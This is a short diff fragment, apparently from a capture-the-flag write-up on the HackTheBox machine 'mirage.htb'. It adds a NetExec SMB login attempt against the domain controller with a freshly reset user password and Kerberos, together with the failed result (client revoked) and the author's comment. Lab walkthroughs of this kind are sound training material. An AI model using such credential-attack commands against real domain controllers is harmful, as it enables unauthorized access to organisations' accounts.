@@ -674,8 +674,14 @@ Clock skew detected. Adjusting local time by 7:00:00.183961. Retrying operation.
 This changed the users password
 
 ```python
-
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123!' -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123! KDC_ERR_CLIENT_REVOKED
 ```
+
+So it looks as if it worked, but there is something stopping me from authenticating
+
+
 
 
 
